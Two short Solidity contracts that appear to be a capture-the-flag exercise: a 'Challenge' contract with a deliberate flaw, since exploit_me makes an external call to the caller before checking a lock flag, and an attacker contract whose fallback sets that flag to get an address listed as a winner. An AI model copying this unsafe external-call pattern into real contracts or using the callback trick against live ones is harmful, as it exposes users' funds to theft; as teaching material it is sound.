pragma solidity 0.8.10;

import "./tob_exploit.sol";

contract IAmAWinnerBaby {

    Challenge public target;

    constructor(address _target) {
        target = Challenge(_target);
    }

    function attack(address _winner) public {
        target.exploit_me(_winner);
    }
    
    fallback() external payable {
        target.lock_me();
    }
}

pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge{

    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}